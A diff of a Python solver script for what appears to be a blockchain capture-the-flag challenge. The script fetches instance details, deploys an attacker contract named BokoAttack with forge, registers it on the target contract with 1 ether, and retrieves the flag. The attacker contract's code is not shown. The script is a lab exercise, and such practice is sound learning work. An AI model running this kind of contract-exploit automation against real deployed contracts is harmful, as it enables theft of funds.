@@ -1,5 +1,8 @@
-from dotenv import dotenv_values
+from solcx import compile_source
 from web3 import Web3
+import os
+import re
+import subprocess
 import requests
 import json
 
@@ -12,10 +15,14 @@ resp = requests.get(START_URL)
 
 JSON_OBJECT = json.loads(resp.text)
 
-MID_URL = JSON_OBJECT['message'].split('/')[1]
-INFO_URL = f"{MAIN_URL}/{MID_URL}/info"
-FLAG_URL = f"{MAIN_URL}/{MID_URL}/flag"
-RPC_URL = f"{MAIN_URL}/{MID_URL}/rpc"
+TOKEN_URL = JSON_OBJECT['message'].split('/')[1]
+INFO_URL = f"{MAIN_URL}/{TOKEN_URL}/info"
+FLAG_URL = f"{MAIN_URL}/{TOKEN_URL}/flag"
+RPC_URL = f"{MAIN_URL}/{TOKEN_URL}/rpc"
+
+print(f"INFO URL : {INFO_URL}")
+print(f"FLAG URL : {FLAG_URL}")
+print(f"RPC URL : {RPC_URL}")
 
 resp = requests.get(INFO_URL)
 
@@ -25,11 +32,11 @@ CONTRACT_ADDRESS = JSON_OBJECT["message"]["level_contract_address"]
 USER_PRIV_KEY = JSON_OBJECT["message"]["user_private_key"]
 USER_ADDRESS = JSON_OBJECT["message"]["user_address"]
 
-print(JSON_OBJECT)
+print(f"Contract Address : {CONTRACT_ADDRESS}")
+print(f"User private key : {USER_PRIV_KEY}")
+print(f"User address : {USER_ADDRESS}")
 
-'''
-# 스마트 컨트랙트 ABI 설정
-ABI = [
+CONTRACT_ABI = [
     {
         "inputs": [],
         "stateMutability": "nonpayable",
@@ -77,32 +84,61 @@ ABI = [
     }
 ]
 
-# 스마트 컨트랙트 연결
 web3 = Web3(Web3.HTTPProvider(RPC_URL))
 
-contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=ABI)
+current_file = os.path.abspath(__file__)
 
-# submit 함수의 input 매개변수에 31337을 전달
-tx = contract.functions.submit(31337).build_transaction({
-    'from' : USER_ADDRESS,
-    'nonce' : web3.eth.get_transaction_count(USER_ADDRESS),
+BASE_DIR = os.path.dirname(current_file) + "/boko-chal"
+CONTRACT_PATH = "/src/BokoAttack.sol"
+
+command = [
+    "forge", "create",
+    "--rpc-url", RPC_URL,
+    "--private-key", USER_PRIV_KEY,
+    BASE_DIR + CONTRACT_PATH + ":BokoAttack",
+    "--broadcast",
+    "--constructor-args",
+    CONTRACT_ADDRESS
+]
+
+try:
+    result = subprocess.run(command, check=True, text=True, capture_output=True)
+    print("CONTRACT DEPLOY SUCCESS!")
+    
+    attacker_address_match = re.search(r"Deployed to: (0x[a-fA-F0-9]{40})", result.stdout)
+
+    ATTACKER_ADDRESS = attacker_address_match.group(1) if attacker_address_match else "Not found..."
+    
+except subprocess.CalledProcessError as e:
+    print("CONTRACT DEPLOY FAILED...")
+    print(e.stderr)
+
+if (ATTACKER_ADDRESS == "Not found..."):
+    print("ATTACKER ADDRESS NOT FOUND...")
+    exit(0)
+
+print(f"Attacker Address : {ATTACKER_ADDRESS}\n")
+
+contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
+
+print("---- DO ATTACK ----")
+
+tx = contract.functions.register(ATTACKER_ADDRESS).build_transaction({
+    "from": USER_ADDRESS,
+    "value": web3.to_wei(1, "ether"),
+    "gasPrice": web3.to_wei(0.000001, "ether"),
+    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
 })
 
-# 트랜젝션 서명 및 전송
 signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIV_KEY)
 tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
 
 print(f"Transaction Hash: {web3.to_hex(tx_hash)}")
 
-# 트랜잭션 결과 확인
-tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
-print(f"Transaction Receipt: {tx_receipt}")
+receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
+print(f"Transaction Receipt: {receipt}\n")
 
-# 플래그 출력
+print("---- GET FLAG ----")
 resp = requests.get(FLAG_URL)
 
-JSON_OBJECT = json.loads(resp.text)
-FLAG = JSON_OBJECT["message"].replace("\n", "")
-
-print(FLAG)
-'''
+print(resp.text)
